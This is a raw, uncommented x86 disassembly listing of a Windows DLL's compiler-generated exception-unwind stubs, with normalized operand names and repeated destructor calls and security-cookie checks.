mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048aa6
mov ecx [ ebp - 0x10 ]
jmp sub_10001cc8
sub_10048aae
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048ac9
mov ecx [ ebp - 0x10 ]
jmp sub_1000a5f6
sub_10048ad1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048aec
push [ ebp - 0x14 ]
call sub_1002004f
pop ecx
retn
sub_10048af6
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10048b0f
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
jmp sub_10007701
sub_10048b2b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048b49
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048b51
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10048b59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048b7e
lea ecx [ ebp - 0x34 ]
jmp sub_10007b41
sub_10048b86
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10048b8e
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048bb6
lea ecx [ ebp - 0x40 ]
jmp sub_10007b41
sub_10048bbe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048be3
lea ecx [ ebp - 0x38 ]
jmp sub_10007b41
sub_10048beb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048c10
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100025e2
sub_10048c1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048c36
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048c51
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10048c59
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048c81
lea ecx [ ebp - 0x34 ]
jmp sub_10007b41
sub_10048c89
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048c91
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048cb6
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_10001da0
sub_10048ccf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048cea
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048cf2
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048cfa
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10048d02
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048d27
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10048d2f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048d54
lea ecx [ ebp + 0xc ]
jmp sub_10007b41
sub_10048d5c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048d77
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048d7f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048da4
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10048dac
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048dd4
mov ecx [ ebp - 0x10 ]
jmp sub_1000d8e6
sub_10048ddc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048df7
mov ecx [ ebp - 0x10 ]
sub ecx 0x50
jmp sub_1000d98a
sub_10048e02
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048e1d
mov ecx [ ebp + 0x8 ]
jmp sub_100025e2
sub_10048e25
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048e40
mov esi [ ebp + 0x8 ]
jmp sub_1000ab44
sub_10048e48
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000ab5f
sub_10048e53
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048e6e
mov esi [ ebp + 0x8 ]
jmp sub_1000a405
sub_10048e76
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000ab5f
sub_10048e81
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048e9c
mov esi [ ebp + 0x8 ]
jmp sub_1000a133
sub_10048ea4
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000ab5f
sub_10048eaf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048eca
mov esi [ ebp + 0x8 ]
jmp sub_10009ea8
sub_10048ed2
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000ab5f
sub_10048edd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048ef8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048f13
lea ecx [ ebp - 0x50 ]
jmp sub_10007b41
sub_10048f1b
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10048f23
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_10048f2b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7c ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048f53
lea ecx [ ebp - 0x54 ]
jmp sub_10007b41
sub_10048f5b
lea ecx [ ebp - 0x4c ]
jmp sub_100025e2
sub_10048f63
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10048f6b
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10048f73
lea ecx [ ebp - 0x60 ]
jmp sub_10007b41
sub_10048f7b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048fa0
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048fa8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048fc3
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_10048fcb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048fe6
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_10001da0
sub_10048fff
lea ecx [ ebp - 0x34 ]
jmp sub_10001da0
sub_10049007
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049022
mov ecx [ ebp + 0x8 ]
jmp sub_100132a0
sub_1004902a
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10049032
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004904d
mov ecx [ ebp - 0x10 ]
sub ecx 0x50
jmp sub_1000d945
sub_10049058
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049073
mov ecx [ ebp - 0x10 ]
jmp sub_100025e2
sub_1004907b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049096
lea ecx [ ebp - 0x34 ]
jmp sub_10001da0
sub_1004909e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100490b9
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_100490c1
lea ecx [ ebp - 0x50 ]
jmp sub_10001da0
sub_100490c9
lea ecx [ ebp - 0x50 ]
jmp sub_10001da0
sub_100490d1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100490f6
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_100490fe
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_10049106
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_1004910e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049133
lea eax [ ebp - 0x24 ]
jmp sub_1001005d
sub_1004913b
lea eax [ ebp - 0x24 ]
jmp sub_1001005d
sub_10049143
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004915e
mov eax [ ebp + 0x8 ]
jmp sub_1000143b
sub_10049166
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049181
lea esi [ ebp - 0x4c ]
jmp sub_1000ab44
sub_10049189
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100491a7
lea esi [ ebp - 0x4c ]
jmp sub_1000a405
sub_100491af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100491cd
mov ecx [ ebp - 0x10 ]
jmp sub_100132a0
sub_100491d5
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_100025e2
sub_100491e0
mov edi [ ebp - 0x10 ]
add edi 0x34
jmp sub_10002634
sub_100491eb
mov ecx [ ebp - 0x10 ]
add ecx 0xbc
jmp sub_100025e2
sub_100491f9
mov ecx [ ebp - 0x10 ]
add ecx 0xd8
jmp sub_1000add8
sub_10049207
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049222
lea ecx [ ebp - 0x70 ]
jmp sub_10001da0
sub_1004922a
lea ecx [ ebp - 0x70 ]
jmp sub_10001da0
sub_10049232
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004923a
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004925b
lea ecx [ ebp - 0x3c ]
jmp sub_10007b41
sub_10049263
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_1004926b
lea ecx [ ebp - 0x5c ]
jmp sub_100025e2
sub_10049273
lea ecx [ ebp - 0x5c ]
jmp sub_100025e2
sub_1004927b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100492a0
mov eax [ ebp + 0x8 ]
jmp sub_100013c2
sub_100492a8
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_100025e2
sub_100492b3
mov ecx [ ebp + 0x8 ]
add ecx 0x38
jmp sub_10001da0
sub_100492be
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10001da0
sub_100492c9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100492e4
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_100289c4
pop ecx
pop ecx
retn
sub_100492f2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004930d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049328
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10049330
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10049338
lea ecx [ ebp - 0xdc ]
jmp sub_10001da0
sub_10049343
lea ecx [ ebp - 0xa4 ]
jmp sub_10001da0
sub_1004934e
lea ecx [ ebp - 0x88 ]
jmp sub_10001da0
sub_10049359
lea ecx [ ebp - 0xc0 ]
jmp sub_10001da0
sub_10049364
lea ecx [ ebp - 0x6c ]
jmp sub_10001da0
sub_1004936c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe4 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049394
lea eax [ ebp - 0x20 ]
jmp sub_1001005d
sub_1004939c
lea eax [ ebp - 0x18 ]
jmp sub_1001005d
sub_100493a4
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0xc ]
jmp sub_100025e2
sub_100493bd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100493d8
lea eax [ ebp + 0x10 ]
jmp sub_1001005d
sub_100493e0
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_1001005d
sub_100493eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049406
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_1004940e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049429
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10049431
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004944c
lea eax [ ebp + 0x10 ]
jmp sub_1001005d
sub_10049454
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_1004945c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049477
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_1001005d
sub_10049482
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004949d
lea ecx [ ebp - 0x40 ]
jmp sub_10001da0
sub_100494a5
push [ ebp - 0x24 ]
call sub_1002004f
pop ecx
retn
sub_100494af
lea eax [ ebp - 0x1c ]
jmp sub_1001005d
sub_100494b7
lea ecx [ ebp - 0x40 ]
jmp sub_10001da0
sub_100494bf
lea esi [ ebp - 0x94 ]
jmp sub_10011bce
sub_100494ca
mov eax [ ebp - 0x20 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x20 ] 0xfffffffe
mov esi [ ebp + 0xc ]
jmp sub_10011bce
sub_100494e3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049501
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_10049509
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10049511
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004952f
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov esi [ ebp - 0x10 ]
jmp sub_1001111d
sub_10049548
lea ecx [ ebp - 0x90 ]
jmp sub_100025e2
sub_10049553
lea ecx [ ebp - 0x74 ]
jmp sub_100025e2
sub_1004955b
lea ecx [ ebp - 0x20 ]
jmp sub_10011795
sub_10049563
lea ecx [ ebp - 0x3c ]
jmp sub_100025e2
sub_1004956b
lea esi [ ebp - 0xb8 ]
jmp sub_10011bce
sub_10049576
lea ecx [ ebp - 0x58 ]
jmp sub_100025e2
sub_1004957e
lea ecx [ ebp - 0x3c ]
jmp sub_100025e2
sub_10049586
lea esi [ ebp - 0xb8 ]
jmp sub_10011bce
sub_10049591
lea ecx [ ebp - 0x58 ]
jmp sub_100025e2
sub_10049599
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xbc ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100495b7
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100495bf
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100495c7
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100495cf
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_100495d7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100495f2
mov ecx [ ebp + 0x8 ]
jmp sub_1000eef5
sub_100495fa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049615
lea ecx [ ebp - 0x34 ]
jmp sub_100025e2
sub_1004961d
lea ecx [ ebp - 0x50 ]
jmp sub_100025e2
sub_10049625
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004964d
lea ecx [ ebp + 0x8 ]
jmp sub_100025e2
sub_10049655
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049670
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_10049678
lea ecx [ ebp - 0x50 ]
jmp sub_1000a5f6
sub_10049680
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004969b
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_100496a3
lea ecx [ ebp - 0x50 ]
jmp sub_1000a5f6
sub_100496ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100496c6
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_100496ce
lea ecx [ ebp - 0x38 ]
call sub_1000a5f6
retn
sub_100496d7
lea esi [ ebp - 0xd0 ]
jmp sub_1000a133
sub_100496e2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049700
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_10049708
lea ecx [ ebp - 0x38 ]
jmp sub_1000a5f6
sub_10049710
lea esi [ ebp - 0xd0 ]
jmp sub_10009ea8
sub_1004971b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049739
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049754
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_1004975c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049777
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_1004977f
lea ecx [ ebp - 0x34 ]
jmp sub_10007b41
sub_10049787
lea ecx [ ebp - 0x6c ]
jmp sub_100025e2
sub_1004978f
lea ecx [ ebp - 0x30 ]
jmp sub_10007b41
sub_10049797
lea ecx [ ebp - 0x50 ]
jmp sub_100025e2
sub_1004979f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100497c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100497df
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_100497e7
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_100497ef
lea ecx [ ebp - 0x48 ]
jmp sub_100025e2
sub_100497f7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004981c
lea ecx [ ebp - 0x30 ]
jmp sub_100025e2
sub_10049824
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049849
lea ecx [ ebp - 0x30 ]
jmp sub_100025e2
sub_10049851
lea ecx [ ebp - 0x4c ]
jmp sub_100025e2
sub_10049859
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004987e
mov eax [ ebp + 0x8 ]
jmp sub_1000143b
sub_10049886
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100498a1
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov edi [ ebp - 0x30 ]
jmp sub_10002634
sub_100498ba
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_100498c2
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_100498ca
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_100498d2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100498ed
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_100498f5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049910
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10049918
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049933
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_1004993b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049956
mov ecx [ ebp - 0x10 ]
jmp sub_10011e55
sub_1004995e
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10049966
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049981
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10049989
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100499a4
lea ecx [ ebp - 0x3c ]
jmp sub_10001da0
sub_100499ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100499c7
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_100499cf
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100499d7
lea ecx [ ebp - 0x70 ]
jmp sub_10001da0
sub_100499df
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x78 ]
xor ecx eax
